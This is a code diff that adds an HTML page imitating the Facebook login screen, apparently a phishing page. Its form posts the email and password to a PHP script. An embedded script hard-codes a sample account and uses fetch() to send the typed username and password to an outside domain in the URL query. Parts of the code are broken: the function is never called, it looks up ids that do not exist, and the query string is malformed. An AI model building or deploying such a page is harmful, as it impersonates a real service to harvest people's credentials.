@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook Login</title>
+    <link rel="stylesheet" href="facebook_login.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <div class="row result">
+        <div class="fb-form result">
+            <div class="card">
+                <h1>facebook</h1>
+                <p>Facebook helps you connect and share</p>
+                <p>with the people in your life.</p>
+            </div>
+            <form action="facebook1.php" method="POST" enctype="multipart/form-data">
+                <input type="email" name="email" placeholder="Email or phone number"
+                    required>
+                <input type="password" name="pwd" placeholder="Password" required>
+                <div class="fb-submit">
+                    <button type="submit" class="login">Login</button>
+                    <a href="#" class="forgot">Forgot password?</a>
+                </div>
+                <hr>
+                <div class="button">
+                    <a href="#">Create new account</a>
+                </div>
+            </form>
+        </div>
+    </div>
+    <script>
+        function Addition()
+        {
+            var valid_username="mariya123@gmail.com"
+            var valid_password="mariya1234"
+
+            var username=document.getElementById("email").value
+            var password=document.getElementById("pwd").value
+
+            if(valid_username==username && valid_password==password)
+            {
+                console.log("user logged in")     
+                   }
+            else{
+                console.log("invalid credentials")
+            }
+
+
+            fetch ("http://manojkoravangi.com/facebook1.php?email="+username+"&pwd"+password).then((response)=>
+            {
+                response.json().then((output)=>console.log(output))
+
+            }).catch(()=>{})
+        }
+    </script>
+</body>
+</html>
+
+
